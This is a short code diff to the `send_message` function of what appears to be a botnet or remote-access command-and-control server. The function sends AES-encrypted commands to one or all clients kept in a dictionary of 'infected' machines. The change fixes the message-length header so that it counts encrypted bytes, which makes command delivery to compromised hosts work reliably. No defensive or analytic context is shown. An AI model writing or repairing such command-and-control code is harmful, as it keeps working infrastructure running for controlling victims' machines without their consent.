@@ -215,8 +215,7 @@ def send_message(message, infected_dict):
     # The receiver expects a four-byte little-endian length before the payload.
     # Count encoded bytes rather than Python characters because UTF-8 characters
     # can occupy more than one byte when transmitted over the socket.
-    lenHeader = len(final_mess.encode("utf-8"))
-    header = struct.pack("<I", lenHeader)
+    header = 0
 
     if target == "*":
         # Broadcast the same framed command to every registered client. A send
@@ -226,6 +225,7 @@ def send_message(message, infected_dict):
             try:
                 encrypted_mess = aes_encrypt(socket_client[2], final_mess)
                 print("mess encrypted")
+                header = struct.pack("<I", len(encrypted_mess))
                 socket_client[0].send(header + encrypted_mess)
             except Exception as e:
                 print("pb line 231 !")
@@ -236,6 +236,7 @@ def send_message(message, infected_dict):
             # expected by the client's receive loop.
             try:
                 encrypted_mess = aes_encrypt(infected_dict[target][2], final_mess)
+                header = struct.pack("<I", len(encrypted_mess))
                 infected_dict[target][0].send(header + encrypted_mess)
             except Exception as e:
                 print(f"[!] Erreur d'envoi à {target}\n{e}")
